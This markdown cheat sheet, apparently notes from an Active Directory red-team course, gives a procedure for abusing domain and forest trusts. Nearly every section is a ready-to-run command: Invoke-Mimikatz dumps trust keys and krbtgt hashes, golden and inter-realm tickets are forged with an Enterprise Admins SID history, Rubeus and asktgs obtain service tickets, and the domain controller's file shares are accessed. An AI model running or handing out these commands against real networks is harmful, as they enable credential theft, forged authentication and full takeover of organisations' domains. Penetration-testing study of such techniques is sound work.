## Within the Same Forest

#### Child to Parent Trust Abuse

Domains in the same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of the same forest.

1. krbtgt hash
2. trust tickets


#### Krbtgt Hash Method

Abuse SID history, obtain the SID for the Enterprise Admins Group of the root domain

```powershell
#Abuse SID History
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

Use Invoke-Mimikatz to forge the inter-realm TGT.

```powershell
#The option /sids is forcefully setting the SID History for the Enterprise Admins group for abc.example.local
#Which is the forest Enterprise admins group
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
```

Breakdown of Invoke-Mimikatz command.

```
Kerberos:golden - Name of the module used
/domain - domain FQDN
/sid - SID of the domain
/sids - SID of the Enterprise Admins group of the parent domain
/krbtgt - hash of krbtgt
/user - User to impersonate
/ticket - path to where ticket will be saved
```

+
Execute this command on any machine in the domainm using the saved ticket.

```powershell
#On any machine in the current domain
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

ls \\root-dc.example.local\c$
gwmi -class win32_operatingsystem -ComputerName root-dc.example.local
```



#### Trust Key Method

In order to forge a trust ticket, we need the trust key

Obtain the trust key using one of the following.

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc

or 

Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\root$"'
```


In the output from the first command we are looking for the hash from [IN] from child to parent to domain.


Forge the inter-realm TGT

```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:229d1532e203aa3a2886c623ec573778 /service:krbtgt /target:example.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"' 
```

Breakdown of Invoke-Mimikatz command.

```
Kerberos:golden - Name of the module used
/domain - domain FQDN
/sid - SID of the domain
/sids - SID of the Enterprise Admins group of the parent domain
/rc4 - RC4 of the trust key
/user - User to impersonate
/service - Target service in the parent domain
/target - FQDN of the parent domain
/ticket - path to where ticket will be saved
```

Obtain a TGS

```powershell
#Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. 
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/root-dc.example.local
#Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.
```


Access Target Service with TGS

```powershell
#Using kirbakator
.\kirbikator.exe lsa .\CIFS.root-dc.example.local.kirbi
ls \\root-dc.example.local\c$ 


#Using Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/root-dc.example.local /dc:root-dc.example.local /ptt
ls \\root-dc.example.local\c$ 
```



## Across Forests


Verify trust relationship between forests.

```powershell
#only external trustt
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
```

Obtain the trust key for the inter-forest trust

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

Or

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```


Forge the Inter-Forest TGT.

```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:3424f66700f8c44560d0b537130ddc39 /service:krbtgt /target:external.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'
```

Break down of Invoke-Mimikatz command.


```
Kerberos:golden - Name of the module used
/domain - domain FQDN
/sid - SID of the current domain
/rc4 - Hash of the external forest found in lsadump::lsa /patch
/user - User to impersonate
/service - Target service in the parent domain
/target - FQDN of the external domain
/ticket - path to where ticket will be saved
```

Request a TGS for a service


```powershell
#Tickets for other services (like HOST and RPCSS for WMI, HOST and  HTTP for PowerShell Remoting and WinRM) can be created as well.
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/external-dc.external.local
```


Use the TGS to access targeted service

```powershell
#using kirbikator
.\kirbikator.exe lsa .\CIFS.external-dc.external.local.kirbi

ls \\external-dc.external.local\Share\


#Using rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/external-dc.external.local /dc:external-dc.external.local /ptt

ls \\external-dc.external.local\share\
```